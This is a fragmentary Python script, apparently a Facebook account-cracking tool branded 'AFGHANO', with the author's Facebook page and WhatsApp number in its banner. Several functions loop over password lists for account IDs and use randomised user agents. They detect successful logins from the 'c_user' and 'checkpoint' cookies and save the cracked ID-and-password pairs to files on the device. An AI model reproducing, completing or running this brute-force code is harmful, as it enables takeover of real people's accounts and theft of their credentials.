...
--------------------------------------------------
>>  Owner    : AFGHANO
>>  Facebook : Afghan Hacher
>>  Version  : 1.0
>>  Whatsapp : +93797423006
--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> 𝗮𝗳𝗴𝗵𝗮𝗻𝗼/😍 TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			os.system(f'xdg-open https://www.facebook.com/afgha.hacker')
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/Afghano.txt')
				linex()
				...
				os.system(f'xdg-open https://www.facebook.com/afgha.hacker');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[𝗮𝗳𝗴𝗵𝗮𝗻𝗼 / 😍] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			Afghano=session.cookies.get_dict().keys()
			if "c_user" in Afghano:
				print('\r\r\033[1;31m[Afghano-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/Afghano-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in Afghano:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[Afghano-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Afghano-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[𝗮𝗳𝗴𝗵𝗮𝗻𝗼 / 😍] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in Afghano:
				...
				print('\r\r\033[1;32m[Afghano-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[Afghano-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97m𝗮𝗳𝗴𝗵𝗮𝗻𝗼 / 😍\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[Afghano-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[Afghano-OK] '+cid+' | '+ps+'\33[0;97m')
